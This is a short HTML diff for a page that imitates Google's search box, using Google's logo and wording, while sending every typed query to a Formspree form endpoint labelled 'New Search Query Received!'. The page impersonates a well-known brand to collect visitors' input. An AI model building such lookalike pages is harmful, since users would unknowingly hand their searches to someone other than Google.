@@ -53,15 +53,15 @@
 </head>
 <body>
 
-  <!-- Replace with your own logo or remove if not needed -->
   <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" class="logo" />
 
   <form
     class="search-box"
-    action="https://formspree.io/f/xeolpgvo"  <!-- Replace with your Formspree form URL -->
+    action="https://formspree.io/f/xeolpgvo"  <!-- Replace yourformid with your Formspree form ID -->
     method="POST"
   >
-    <input type="text" name="search" placeholder="Search Google or type a URL" required />
+    <input type="hidden" name="_subject" value="New Search Query Received!" />
+    <input type="text" name="search_query" placeholder="Search Google or type a URL" required />
     <button type="submit">Search</button>
   </form>
 
